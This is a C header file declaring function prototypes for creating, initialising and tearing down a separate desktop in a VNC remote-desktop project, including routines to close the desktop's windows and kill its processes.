//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: desktop.h
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	creating and initializing vnc desktop

#ifndef __DESKTOP_H_
#define __DESKTOP_H_

DWORD CreateNewDesktop ( PVNC_SESSION pSession, PTCHAR DeskName, int DeskNameLength, OUT PPIXEL_FORMAT LocalPixelFormat );
DWORD DeskInitailize ( PVNC_SESSION pSession );
DWORD DeskInitializeClient( PVNC_DESKTOP pDesktop, PVNC_SHARED_SECTION VncSharedSection );

DWORD DeskInitScreen(PVNC_SESSION pSession);
DWORD DeskInitDCs( PVNC_DESKTOP pDesktop );
DWORD DeskInitIntermedDC( PVNC_DESKTOP pDesktop,HDC hTmpDC, BOOL bClient );
VOID DeskRelease( PVNC_DESKTOP pDesktop );

VOID DeskCloseWindows( PVNC_DESKTOP pDesktop );
VOID DeskKillAllProcesses( PVNC_DESKTOP pDesktop );

#endif //__DESKTOP_H_